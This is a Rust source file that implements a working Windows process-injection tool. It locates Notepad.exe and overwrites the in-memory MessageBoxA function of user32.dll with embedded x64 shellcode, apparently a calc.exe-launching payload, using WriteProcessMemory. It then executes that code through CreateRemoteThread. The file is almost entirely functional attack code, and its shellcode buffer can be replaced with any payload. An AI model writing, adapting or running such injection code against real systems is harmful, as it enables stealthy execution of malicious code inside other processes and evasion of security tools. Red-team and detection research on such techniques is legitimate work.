use std::{ffi::CStr, mem::{transmute, zeroed}, ptr::{null, null_mut}};

use winapi::{
    ctypes::c_void,
    um::{
        errhandlingapi::GetLastError, handleapi::{CloseHandle}, libloaderapi::{GetProcAddress, LoadLibraryA}, memoryapi::{WriteProcessMemory}, processthreadsapi::{CreateRemoteThread, OpenProcess}, synchapi::WaitForSingleObject, tlhelp32::{
            CreateToolhelp32Snapshot, PROCESSENTRY32, Process32First, Process32Next,
            TH32CS_SNAPPROCESS,
        }, winnt::{PROCESS_ALL_ACCESS}
    },
};

const TARGET_DLL: &[u8] = b"user32.dll\0";
const TARGET_FUNC: &[u8] = b"MessageBoxA\0";

const BUF: &[u8] = &[
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
    0x65, 0x78, 0x65, 0x00,
];

fn find_pid(process_name: &str, pid: &mut u32) -> bool {
    unsafe {
        let mut process_entry = zeroed::<PROCESSENTRY32>();

        process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

        let h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if h_snapshot.is_null() {
            println!(
                "[-] CreateToolhelp32Snapshot failed with error: {}",
                GetLastError()
            );
            return false;
        }

        if Process32First(h_snapshot, &mut process_entry) == 0 {
            println!("[-] Process32First failed with error: {}", GetLastError());
            return false;
        }

        loop {
            let proc_name = CStr::from_ptr(process_entry.szExeFile.as_ptr())
                .to_str()
                .unwrap();
            if proc_name.to_lowercase() == process_name.to_lowercase() {
                *pid = process_entry.th32ProcessID;
                break;
            }

            if Process32Next(h_snapshot, &mut process_entry) == 0 {
                break;
            }
        }

        if *pid == 0 {
            return false;
        }
    }

    return true;
}

fn pause() {
    println!("[*] Press Enter to continue...");
    let mut input = String::new();
    let _ = std::io::stdin().read_line(&mut input);
}

fn main() {
    unsafe {
        let process_name = "Notepad.exe";
        let mut pid: u32 = 0;
        let mut h_process: *mut c_void = null_mut();

        if !find_pid(process_name, &mut pid) {
            println!("[-] Failed to find process: {}", process_name);
            return;
        }

        println!("[+] Found process {} with PID: {}", process_name, pid);

        if !h_process.is_null() {
            CloseHandle(h_process);
        }

        let h_user32 = LoadLibraryA(TARGET_DLL.as_ptr() as *const i8);

        if h_user32.is_null() {
            println!("[-] LoadLibraryA failed with error: {}", GetLastError());
            return;
        }   
        println!("[+] BaseAddress of {} : {:p}", std::str::from_utf8(TARGET_DLL).unwrap(), h_user32);

        let func_addr = GetProcAddress(h_user32, TARGET_FUNC.as_ptr() as *const i8);

        if func_addr.is_null() {
            println!("[-] GetProcAddress failed with error: {}", GetLastError());
            return;
        }

        println!("[+] Found address of {} : {:p}", std::str::from_utf8(TARGET_FUNC).unwrap(), func_addr);
        
        h_process = OpenProcess(PROCESS_ALL_ACCESS, 1, pid);

        let mut bytes_written: usize = 0;

        if WriteProcessMemory(h_process, func_addr as *mut c_void, BUF.as_ptr() as *const c_void, BUF.len(), &mut bytes_written) == 0 {
            println!("[-] WriteProcessMemory failed with error: {}", GetLastError());
            return;
        }

        println!("[+] Successfully overwrote {} bytes at address {:p}", bytes_written, func_addr);

        let mut thread_id: u32 = 0;

        let h_thread = CreateRemoteThread(h_process, null_mut(), 0, Some(transmute(func_addr)), null_mut(), 0, &mut thread_id);

        if h_thread.is_null() {
            println!("[-] CreateRemoteThread failed with error: {}", GetLastError());
            return;
        }

        println!("[+] Successfully created remote thread with ID: {}", thread_id);

        WaitForSingleObject(h_thread, 0xFFFFFFFF);

        pause();

    }
}
